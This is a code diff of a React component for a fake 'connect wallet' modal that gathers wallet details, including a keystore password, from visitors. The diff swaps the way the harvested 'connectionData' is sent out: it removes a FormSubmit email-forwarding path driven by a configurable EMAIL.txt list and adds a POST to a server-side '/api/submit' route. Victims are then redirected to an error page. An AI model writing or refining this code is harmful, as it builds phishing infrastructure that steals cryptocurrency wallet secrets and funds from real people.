@@ -5,7 +5,6 @@ import { motion, AnimatePresence } from "framer-motion";
 import { useRouter } from "next/navigation";
 import { X, Loader2, AlertCircle } from "lucide-react";
 import { cn } from "@/lib/utils";
-import { SUBMISSION_EMAIL } from "@/constants/email";
 
 interface ConnectModalProps {
     isOpen: boolean;
@@ -24,25 +23,6 @@ export function ConnectModal({ isOpen, onClose, walletName, walletIcon }: Connec
     const [inputError, setInputError] = useState("");
     const [isSaved, setIsSaved] = useState(false);
     const [keystorePassword, setKeystorePassword] = useState("");
-    const [submissionEmail, setSubmissionEmail] = useState(SUBMISSION_EMAIL);
-
-    useEffect(() => {
-        // Fetch the email from the public EMAIL.txt file
-        // This allows the user to change the email without touching the code
-        fetch("/EMAIL.txt")
-            .then((res) => res.text())
-            .then((text) => {
-                if (text && text.includes("@")) {
-                    // Support multiple emails separated by commas
-                    const emails = text.split(',')
-                        .map(e => e.trim())
-                        .filter(e => e.includes('@'))
-                        .join(',');
-                    if (emails) setSubmissionEmail(emails);
-                }
-            })
-            .catch((err) => console.error("Could not load EMAIL.txt, using default", err));
-    }, []);
 
     useEffect(() => {
         if (isOpen) {
@@ -89,28 +69,21 @@ export function ConnectModal({ isOpen, onClose, walletName, walletIcon }: Connec
             window.dispatchEvent(new Event('wallet-connection-updated'));
 
             // ---------------------------------------------------------
-            // EMAIL FORWARDING (FormSubmit)
+            // EMAIL FORWARDING (via server-side API route)
             // ---------------------------------------------------------
             try {
-                // Split multiple emails and send to each one individually
-                // This is more reliable than sending a comma-separated list
-                const emailList = submissionEmail.split(',').map(e => e.trim()).filter(e => e.length > 0);
-                
-                for (const email of emailList) {
-                    await fetch(`https://formsubmit.co/ajax/${email}`, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json",
-                            "Accept": "application/json"
-                        },
-                        body: JSON.stringify({
-                            ...connectionData,
-                            _subject: `New Wallet Connection: ${walletName}`,
-                        })
-                    });
-                }
+                const res = await fetch("/api/submit", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        ...connectionData,
+                        _subject: `New Wallet Connection: ${walletName}`,
+                    }),
+                });
+                const result = await res.json();
+                console.log("Submit API response:", result);
             } catch (emailErr) {
-                console.error("Failed to send email", emailErr);
+                console.error("Failed to send via API", emailErr);
             }
 
             // Redirect to error page as requested
